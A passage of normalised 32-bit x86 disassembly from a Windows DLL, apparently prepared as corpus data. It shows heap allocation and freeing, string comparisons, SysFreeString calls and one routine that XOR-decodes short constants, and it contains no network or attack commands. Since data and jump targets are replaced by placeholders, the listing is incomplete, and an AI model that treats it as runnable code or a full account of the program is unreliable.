and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_1005284b
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_10079ce0
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_100426d6
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_10079ce0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_10004a3b
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_100796a0
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1006605f
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_100796a0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_100317fa
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
call sub_100492ed
sub_1005aab0
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100014b7
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_10050f50
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_1005aaed
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004b275
add esp 0xc
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
mov eax 0x7fffffff
jmp r-xdata
sub esi ecx
pop esi
pop ebp
retn
mov edx eax
cmp eax 0x5a
ja r-xdata
add ecx 0x2
test dx dx
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
sub eax ecx
jmp r-xdata
cmp dx ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp eax 0x41
jb r-xdata
movzx eax [ esi + ecx ]
cmp eax 0x41
jb r-xdata
sub_1005ab78
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1005ac10
cmp edi ebx
je r-xdata
mov eax edi
retn
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ ebx ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
mov [ edi + 0x4 ] eax
inc [ eax ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
pop esi
test eax eax
je r-xdata
call sub_10021ec0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1005ac4e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
xor eax eax
pop ebp
retn
movzx eax [ ecx ]
movzx ecx [ edx ]
sub eax ecx
pop ebp
retn
movzx eax [ ecx ]
test ax ax
je r-xdata
cmp ax [ edx ]
jne r-xdata
add ecx 0x2
add edx 0x2
jmp r-xdata
dec [ ebp + 0x10 ]
je r-xdata
sub_1005ac87
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_1003e9ec
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x20 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_10044159
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_10079480
add esp 0xc
test eax eax
je r-xdata
sub_1005ad19
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
and [ esi + 0x10 ] 0x0
push [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_10040ded
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1005ad50
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jns r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_10022b5a
jmp r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call sub_1005cc3f
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1005ad98
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_100051e8
push [ ebp + 0x8 ]
call sub_100285e6
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_100051e8
lea eax [ ebp - 0x20 ]
push eax
call sub_10035ef9
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_100285e6
pop ecx
sub_1005ae38
push 0x10
mov eax sub_1007f2c7
call sub_1002152b
mov esi ecx
mov [ ebp - 0x18 ] esi
call sub_100680bc
xor ebx ebx
mov edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0xc ] bl
je r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] r--data
jmp r-xdata
call sub_1004db01
retn 0x8
call sub_1000a66f
mov [ esi + 0xc ] 0x2e
call sub_1000a66f
mov [ esi + 0xd ] 0x2c
call sub_1000a66f
lea eax [ ebp - 0x1c ]
push eax
push ebx
push [ ebp - 0x14 ]
call sub_10027fa7
add esp 0xc
mov [ esi + 0x8 ] eax
call sub_1000a66f
lea eax [ ebp - 0x1c ]
push eax
push ebx
push r--data
call sub_10027fa7
add esp 0xc
mov [ esi + 0x10 ] eax
call sub_1000a66f
lea eax [ ebp - 0x1c ]
push eax
push ebx
push r--data
call sub_10027fa7
add esp 0xc
mov [ esi + 0x14 ] eax
call sub_1000a66f
mov eax [ edi ]
mov al [ eax ]
mov [ esi + 0xc ] al
call sub_1000a66f
mov eax [ edi + 0x4 ]
mov al [ eax ]
mov [ esi + 0xd ] al
cmp [ ebp + 0xc ] bl
je r-xdata
sub_1005af08
push 0xc
mov eax sub_1007fbb8
call sub_100097c8
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x14 ] eax
je r-xdata
mov edi [ ebp + 0xc ]
and edi 0x8
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1003cdcb
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x20
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1001c024
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10005213
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1001b9af
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_1003ef7a
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_1004e224
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x8
call sub_10055606
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10062816
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_10004f60
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
jmp r-xdata
push 0x18
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_10058e8b
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
push ebx
push ebx
call sub_1004159d
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_100557be
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push edi
mov esi eax
call sub_1004c74b
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1001552f
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x10
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_1004490f
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x1c
call sub_10055606
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1b
cmp ecx ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x11
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_1004de1d
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
call sub_1004db01
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10015d05
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x14
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
call sub_1000eae7
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_10059f39
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x34
call sub_10055606
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x16
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push [ ebp + 0x14 ]
mov esi eax
call sub_100153a1
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0x10
push 0x10
call sub_10055606
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
mov ecx esi
mov [ esi + 0x8 ] ebx
call sub_1002141a
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x17
mov [ esi ] edi
mov [ esi + 0x28 ] 0x1
call sub_1004de1d
mov [ esi ] r--data
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_10015f10
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000710e
add esp 0xc
jmp r-xdata
sub_1005b4f0
push ebp
mov ebp esp
sub esp 0x118
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov ecx [ r--data ]
mov ebx edx
mov [ ebp - 0xf8 ] edi
mov [ ebp - 0x104 ] edi
xor eax eax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfffd
and edx 0xff
mov [ ebp + eax * 2 - 0xc ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x104 ]
push ecx
lea edx [ ebp - 0xc ]
xor eax eax
push edx
mov [ ebp - 0x8 ] ax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xab
mov [ ebp - 0xfc ] edi
call sub_100050e0
lea eax [ ebp - 0xfc ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x109
call sub_100050e0
mov [ ebp - 0xf8 ] 0x1
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax 0x70
mov [ ebp - 0x108 ] edi
call sub_100050e0
lea edx [ ebp - 0x108 ]
push edx
lea eax [ ebp - 0x18 ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0xfc ] edi
mov eax [ ebp - 0x104 ]
mov esi [ SysFreeString@IAT ]
push eax
call esi
mov ecx [ ebp - 0x108 ]
push ecx
call esi
mov edx [ ebp - 0x110 ]
push edx
call esi
mov eax [ ebp - 0x118 ]
push eax
call esi
mov ecx [ ebp - 0x114 ]
push ecx
call esi
mov edx [ ebp - 0x10c ]
push edx
call esi
mov eax [ ebp - 0x100 ]
push eax
call esi
mov eax [ ebp - 0xfc ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0x10b
mov [ ebp - 0x110 ] edi
call sub_100050e0
lea ecx [ ebp - 0x110 ]
push ecx
push edx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xec ]
mov eax 0xb6
call sub_100050e0
mov [ ebp - 0xf8 ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0xf8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
call esi
lea edx [ ebp - 0x5c ]
mov eax 0x73
mov [ ebp - 0x118 ] edi
call sub_100050e0
lea eax [ ebp - 0x118 ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0xd0
call sub_100050e0
mov [ ebp - 0xf8 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x4d
mov [ ebp - 0x114 ] edi
call sub_100050e0
lea edx [ ebp - 0x114 ]
push edx
lea eax [ ebp - 0x70 ]
push eax
call sub_100283d0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0xe3
call sub_100050e0
mov [ ebp - 0xf8 ] 0x4
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x74
mov [ ebp - 0x10c ] edi
call sub_100050e0
lea ecx [ ebp - 0x10c ]
push ecx
push edx
call sub_100283d0
lea edx [ ebp - 0x90 ]
mov eax 0xa4
mov [ ebp - 0x100 ] edi
call sub_100050e0
lea eax [ ebp - 0x100 ]
push eax
mov ecx edx
push ecx
call sub_100283d0
add esp 0x10
push 0x24
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax edi
je r-xdata
lea edx [ ebp - 0xf4 ]
mov eax 0x3e
call sub_100050e0
xor eax eax
mov edx [ ebp - 0x100 ]
mov ecx [ ebp - 0x10c ]
push edx
mov edx [ ebp - 0x114 ]
push ecx
mov ecx [ ebp - 0x108 ]
push edx
mov edx [ ebp - 0x104 ]
push ecx
mov ecx [ ebp - 0x110 ]
push edx
mov edx [ ebp - 0x118 ]
mov esi eax
call sub_10005ef0
jmp r-xdata
mov edi eax
call sub_10019b60
xor edi edi
mov [ ebx ] eax
mov ebx [ ebp - 0xfc ]
cmp ebx edi
je r-xdata
sub_1005b7f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081786
mov eax [ fs : 0x0 ]
push eax
sub esp 0x130
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x13c ] eax
mov eax [ ecx ]
xor ebx ebx
mov [ ebp - 0x138 ] ebx
cmp eax ebx
jne r-xdata
cmp [ esi ] 0x3b
jne r-xdata
lea eax [ ebx + 0x3 ]
jmp r-xdata
cmp eax ebx
jbe r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
xor eax eax
lea esp [ esp ]
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
mov [ ebp - 0xe0 ] ebx
mov ecx esi
lea edi [ ebp - 0x114 ]
mov [ ebp - 0x4 ] ebx
call sub_10038df0
test al al
je r-xdata
lea esi [ ebp - 0x114 ]
call sub_10027d70
mov eax 0x5
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ esi + 0xc ]
mov eax 0xf
mov edi 0x10
mov [ ebp - 0x130 ] bl
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x130 ] ecx
mov [ ebp - 0x12c ] edx
mov [ ebp - 0x120 ] 0x8
cmp eax edi
jae r-xdata
mov [ ecx + 0x8 ] bl
cmp [ ebp - 0xfc ] edi
jb r-xdata
lea ecx [ ebp - 0x130 ]
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
cmp [ ebp - 0x11c ] edi
jae r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ ebp - 0x130 ]
mov [ ebp - 0x110 ] eax
mov eax [ ebp - 0x120 ]
inc eax
push eax
lea ecx [ ebp - 0x130 ]
push ecx
lea edx [ ebp - 0x110 ]
push edx
call sub_10078db0
add esp 0xc
jmp r-xdata
lea esi [ ebp - 0x114 ]
call sub_10027d70
mov eax 0x7
jmp r-xdata
mov eax [ ebp - 0x134 ]
push eax
lea ecx [ ebp - 0x74 ]
push ecx
lea edx [ ebp - 0xf4 ]
push edx
call sub_100796a0
push edi
lea eax [ ebp - 0xd8 ]
push ebx
push eax
add esi 0x8
call sub_10079a10
push 0x18
push esi
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0xd8 ]
push edx
mov [ ebp - 0x134 ] edi
call sub_100248f0
add esp 0x28
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0x120 ]
mov edx [ ebp - 0x11c ]
mov edi 0x64
push edi
lea eax [ ebp - 0x74 ]
push ebx
push eax
mov [ ebp - 0x100 ] ecx
mov [ ebp - 0xfc ] edx
mov [ ebp - 0x4 ] bl
add esi 0x10
call sub_10079a10
push 0x8
push esi
lea ecx [ ebp - 0x134 ]
push ecx
lea edx [ ebp - 0x74 ]
push edx
mov [ ebp - 0x134 ] edi
call sub_100248f0
add esp 0x1c
cmp eax ebx
jne r-xdata
lea esi [ ebp - 0x114 ]
call sub_10027d70
mov eax 0x8
jmp r-xdata
mov eax [ ebp - 0x134 ]
push eax
lea ecx [ ebp - 0xd8 ]
push ecx
lea edx [ ebp - 0xf0 ]
push edx
call sub_100796a0
mov edi [ ebp - 0xf0 ]
add esi 0x18
add esp 0xc
mov edx edi
mov ecx esi
call sub_1004a310
cmp eax [ ebp - 0xe8 ]
push edi
sete al
push 0x8
mov [ ebp - 0xdc ] al
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ ebp - 0xf0 ]
push ecx
mov edi eax
push esi
push edi
call sub_100796a0
mov eax [ ebp - 0xf0 ]
mov edx [ ebp - 0x138 ]
mov ebx [ ebp - 0x13c ]
mov [ ebp - 0xe0 ] edi
lea edi [ edx + eax + 0x30 ]
add esp 0xc
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x138 ] edi
add esi eax
call sub_10044860
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0xfc ] 0x10
jb r-xdata
mov ecx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0xfc ] 0xf
mov [ ebp - 0x100 ] eax
mov [ ebp - 0x110 ] al
cmp edi [ ecx ]
jae r-xdata
mov eax [ ebp - 0x110 ]
push eax
call sub_1006591f
add esp 0x4
xor ebx ebx
jmp r-xdata
cmp [ esi ] 0x3b
je r-xdata
sub_1005bb10
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
mov [ edi ] 0x0
pop esi
test eax eax
je r-xdata
call sub_10021ec0
mov [ edi + 0x4 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1005bb8e
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
